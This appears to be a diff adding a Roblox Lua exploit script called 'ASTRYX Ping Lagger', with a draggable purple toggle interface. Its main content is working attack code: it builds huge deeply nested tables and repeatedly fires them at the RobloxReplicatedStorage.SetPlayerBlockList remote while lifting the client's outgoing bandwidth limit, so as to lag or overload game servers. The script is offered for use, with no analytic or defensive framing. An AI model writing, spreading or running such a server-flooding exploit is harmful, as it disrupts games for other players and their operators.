@@ -1,0 +1,286 @@
+--[[ASTRYX Ping Lagger]]
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ============================================================
+--  LAGGER CODE
+-- ============================================================
+
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+local LAGGER_CONFIG = isMobile and {
+    TableIncrease = 290,
+    Tries         = 1,
+    LoopWaitTime  = 0.85
+} or {
+    TableIncrease = 265,
+    Tries         = 1,
+    LoopWaitTime  = 0.05
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+local function resolveRemote(path)
+    if not path or path == "" then return nil end
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then
+            obj = obj[segment]
+        else
+            return nil
+        end
+    end
+    return obj
+end
+
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable / (val + 2)
+end
+
+local function bomb(tableincrease, tries)
+    local maintable    = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local laggerEnabled = false
+local laggerThread  = nil
+
+local function startLaggerLoop()
+    while laggerEnabled do
+        pcall(function()
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        end)
+        task.spawn(function()
+            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+        end)
+        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+    end
+end
+
+local function stopLaggerLoop()
+    laggerEnabled = false
+    if laggerThread then
+        coroutine.close(laggerThread)
+        laggerThread = nil
+    end
+end
+
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(startLaggerLoop)
+    coroutine.resume(laggerThread)
+end
+
+-- ============================================================
+--  ASTRYX GUI (roxo + sem imagem + sem nametag)
+-- ============================================================
+
+local oldGui = playerGui:FindFirstChild("AstryxPingUI")
+if oldGui then oldGui:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "AstryxPingUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = playerGui
+
+-- Cores roxas
+local PURPLE_DARK   = Color3.fromRGB(22, 8, 38)
+local PURPLE_MID    = Color3.fromRGB(50, 18, 85)
+local PURPLE_MAIN   = Color3.fromRGB(145, 55, 255)
+local PURPLE_LIGHT  = Color3.fromRGB(185, 100, 255)
+local PURPLE_BTN    = Color3.fromRGB(85, 30, 150)
+
+-- Main card
+local card = Instance.new("Frame")
+card.Name = "MainCard"
+card.AnchorPoint = Vector2.new(0.5, 0.5)
+card.Position = UDim2.fromScale(0.5, 0.5)
+card.Size = UDim2.fromOffset(380, 145)
+card.BackgroundColor3 = PURPLE_DARK
+card.BorderSizePixel = 0
+card.Active = true
+card.Parent = gui
+
+local cardCorner = Instance.new("UICorner")
+cardCorner.CornerRadius = UDim.new(0, 18)
+cardCorner.Parent = card
+
+local cardStroke = Instance.new("UIStroke")
+cardStroke.Color = PURPLE_MAIN
+cardStroke.Thickness = 2
+cardStroke.Parent = card
+
+-- Title
+local title = Instance.new("TextLabel")
+title.AnchorPoint = Vector2.new(0, 0.5)
+title.Position = UDim2.new(0, 22, 0, 32)
+title.Size = UDim2.new(1, -150, 0, 28)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBlack
+title.Text = "ASTRYX"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 22
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 3
+title.Parent = card
+
+-- Top-right buttons
+local function makeIconButton(text, position)
+    local button = Instance.new("TextButton")
+    button.AnchorPoint = Vector2.new(0.5, 0.5)
+    button.Position = position
+    button.Size = UDim2.fromOffset(38, 38)
+    button.BackgroundColor3 = PURPLE_MID
+    button.BorderSizePixel = 0
+    button.Text = text
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 22
+    button.Font = Enum.Font.GothamBold
+    button.ZIndex = 4
+    button.Parent = card
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 9)
+    corner.Parent = button
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = PURPLE_MAIN
+    stroke.Thickness = 1.2
+    stroke.Parent = button
+
+    return button
+end
+
+local minusBtn = makeIconButton("−", UDim2.new(1, -85, 0, 32))
+local gearBtn = makeIconButton("⚙", UDim2.new(1, -38, 0, 32))
+
+-- Activation button
+local activate = Instance.new("TextButton")
+activate.Name = "ActivateButton"
+activate.AnchorPoint = Vector2.new(0.5, 0.5)
+activate.Position = UDim2.new(0.5, 0, 0.68, 0)
+activate.Size = UDim2.new(1, -48, 0, 48)
+activate.BackgroundColor3 = PURPLE_BTN
+activate.BorderSizePixel = 0
+activate.AutoButtonColor = false
+activate.Font = Enum.Font.GothamBlack
+activate.Text = "ACTIVATE"
+activate.TextColor3 = Color3.fromRGB(255, 255, 255)
+activate.TextSize = 18
+activate.ZIndex = 4
+activate.Parent = card
+
+local activateCorner = Instance.new("UICorner")
+activateCorner.CornerRadius = UDim.new(0, 12)
+activateCorner.Parent = activate
+
+local activateStroke = Instance.new("UIStroke")
+activateStroke.Color = PURPLE_LIGHT
+activateStroke.Thickness = 1.5
+activateStroke.Parent = activate
+
+-- Toggle Logic
+local isToggled = false
+
+local function setToggle(state)
+    isToggled = state
+    laggerEnabled = state
+
+    if state then
+        startLagger()
+        activate.Text = "DEACTIVATE"
+        activate.BackgroundColor3 = Color3.fromRGB(0, 170, 90)
+        activateStroke.Color = Color3.fromRGB(0, 255, 140)
+    else
+        stopLaggerLoop()
+        activate.Text = "ACTIVATE"
+        activate.BackgroundColor3 = PURPLE_BTN
+        activateStroke.Color = PURPLE_LIGHT
+    end
+end
+
+local function flipToggle()
+    setToggle(not isToggled)
+end
+
+activate.MouseButton1Click:Connect(flipToggle)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.V then
+        flipToggle()
+    end
+end)
+
+-- Drag Logic
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+card.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = card.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+card.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        card.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
